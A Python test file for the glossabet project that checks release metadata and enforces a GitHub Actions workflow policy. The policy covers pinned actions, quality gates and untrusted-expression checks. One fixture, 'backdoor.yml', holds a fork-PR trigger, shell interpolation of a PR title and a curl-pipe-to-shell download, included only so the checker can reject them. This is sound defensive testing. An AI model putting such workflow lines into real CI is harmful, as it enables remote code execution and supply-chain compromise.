"""Release automation stays full-matrix, manual, and metadata-consistent."""

from pathlib import Path

from glossabet import __version__
from scripts.check_workflows import check_workflows, validate_workflow_texts

ROOT = Path(__file__).resolve().parents[1]


def test_release_metadata_matches_package_version_and_supported_pythons():
    pyproject = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    init = (ROOT / "glossabet" / "__init__.py").read_text(encoding="utf-8")
    assert f'__version__ = "{__version__}"' in init
    for minor in range(10, 15):
        assert f'"Programming Language :: Python :: 3.{minor}"' in pyproject
    assert 'requires-python = ">=3.10"' in pyproject
    assert 'requires = ["hatchling>=1.32,<1.33"]' in pyproject
    assert "dependencies =" not in pyproject
    assert 'dev = ["pytest"]' in pyproject


def _workflow_texts() -> dict[str, str]:
    directory = ROOT / ".github" / "workflows"
    return {
        name: (directory / name).read_text(encoding="utf-8")
        for name in ("quality.yml", "ci.yml", "release.yml")
    }


def test_reusable_quality_gate_controls_ci_and_release():
    assert check_workflows() == []
    attributes = (ROOT / ".gitattributes").read_text(encoding="utf-8")
    assert "* text=auto eol=lf" in attributes


def test_workflow_policy_rejects_meaningful_gate_weakening():
    originals = _workflow_texts()
    mutations = [
        (
            "quality.yml",
            "os: [ubuntu-latest, macos-latest, windows-latest]",
            "os: [ubuntu-latest, macos-latest]",
        ),
        (
            "quality.yml",
            'python-version: ["3.10", "3.11", "3.12", "3.13", "3.14"]',
            'python-version: ["3.11", "3.12", "3.13", "3.14"]',
        ),
        ("quality.yml", "needs: test", "needs: []"),
        (
            "ci.yml",
            "uses: ./.github/workflows/quality.yml",
            "uses: ./.github/workflows/bypass.yml",
        ),
        (
            "release.yml",
            "uses: ./.github/workflows/quality.yml",
            "uses: ./.github/workflows/bypass.yml",
        ),
        ("release.yml", "needs: quality", "needs: []"),
        (
            "release.yml",
            "inputs.confirmation == 'publish-glossabet-to-pypi'",
            "inputs.confirmation != ''",
        ),
        (
            "release.yml",
            "python evaluation/run.py --verify-results evaluation/results.json --current",
            "python -c pass",
        ),
        (
            "quality.yml",
            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
            "python -c pass",
        ),
        (
            "release.yml",
            "python evaluation/review.py --verify-results evaluation/reviewer-results.json --current",
            "python -c pass",
        ),
        (
            "release.yml",
            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json --current",
            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
        ),
        (
            "quality.yml",
            "python scripts/build_plugin.py dist",
            "python -c pass",
        ),
        (
            "release.yml",
            "git diff --exit-code -- plugins/glossabet",
            "git status --short",
        ),
        (
            "release.yml",
            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG" --current',
            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG"',
        ),
        (
            "release.yml",
            "python scripts/build_plugin.py dist",
            "python -c pass",
        ),
        (
            "release.yml",
            "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
            "pypa/gh-action-pypi-publish@v1",
        ),
    ]

    for filename, original, weakened in mutations:
        assert original in originals[filename]
        workflows = dict(originals)
        workflows[filename] = workflows[filename].replace(
            original, weakened, 1
        )
        assert validate_workflow_texts(workflows), (
            f"workflow policy accepted weakening in {filename}: {weakened}"
        )


def test_distribution_content_guard_catches_local_home_paths():
    from scripts.check_distribution import _LOCAL_PATH_RE

    # Build the samples from parts so this test file itself carries no
    # contiguous home-path literal that would trip the guard when tests/
    # ships in the sdist.
    posix = b"trace " + b"/home/" + b"alice/Projects/x"
    windows = b"C:" + b"\\Users\\" + b"dev\\proj"
    root_home = b"trace " + b"/roo" + b"t/.local/bin/glossabet"
    assert _LOCAL_PATH_RE.search(posix)
    assert _LOCAL_PATH_RE.search(windows)
    # the superuser home directory (root's) must also be caught
    assert _LOCAL_PATH_RE.search(root_home)
    # ...but an ordinary nested directory of that name must not false-positive
    assert not _LOCAL_PATH_RE.search(b"/usr/" + b"roo" + b"t/share")
    # the guard's own pattern source must not be a self-match
    assert not _LOCAL_PATH_RE.search(b"(?:/home/|/Users/)[literal]")


def test_workflow_policy_ignores_comments_and_checks_every_workflow_file(tmp_path):
    """The checker was a substring matcher: every required step present only
    inside `#` comments passed, an unpinned action or `pull_request_target`
    in a fourth file was never read, and an expression interpolated into a
    shell line went unnoticed. Comments are stripped first, every file in
    the directory is held to the global rules, and the publish job's tag must
    arrive through `env:`."""
    from scripts.check_workflows import check_workflows, validate_workflow_texts

    workflows = {
        path.name: path.read_text(encoding="utf-8")
        for path in (ROOT / ".github" / "workflows").iterdir()
        if path.suffix == ".yml"
    }
    assert validate_workflow_texts(workflows) == []

    # Guards and steps moved into comments no longer satisfy the checker.
    commented = dict(workflows)
    commented["release.yml"] = "\n".join(
        ("# " + line if "startsWith(github.ref_name, 'v')" in line else line)
        for line in workflows["release.yml"].splitlines()
    )
    assert any("publish guard is missing" in e for e in validate_workflow_texts(commented))

    # Interpolating the tag straight into the shell line is refused.
    inline = dict(workflows)
    inline["release.yml"] = workflows["release.yml"].replace(
        '--tag "$RELEASE_TAG"', '--tag "${{ github.ref_name }}"'
    )
    assert any("untrusted expression into a shell line" in e for e in validate_workflow_texts(inline))

    # A fourth workflow file is read: fork-PR trigger, tag-pinned action, and
    # an event expression in a run line are all reported.
    extra = dict(workflows)
    extra["backdoor.yml"] = (
        "on:\n  pull_request_target:\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - uses: actions/checkout@v4\n"
        "      - run: echo ${{ github.event.pull_request.title }}\n"
        "      - run: curl -sSf https://x/install.sh | sh\n"
    )
    errors = validate_workflow_texts(extra)
    assert any("pull_request_target" in e for e in errors)
    assert any("unpinned action" in e for e in errors)
    assert any("untrusted expression" in e for e in errors)
    assert any("pipes a download" in e for e in errors)

    # And check_workflows() reads the whole directory, not three fixed names.
    for name, text in extra.items():
        (tmp_path / name).write_text(text, encoding="utf-8")
    assert check_workflows(tmp_path)
    (tmp_path / "backdoor.yml").unlink()
    assert check_workflows(tmp_path) == []
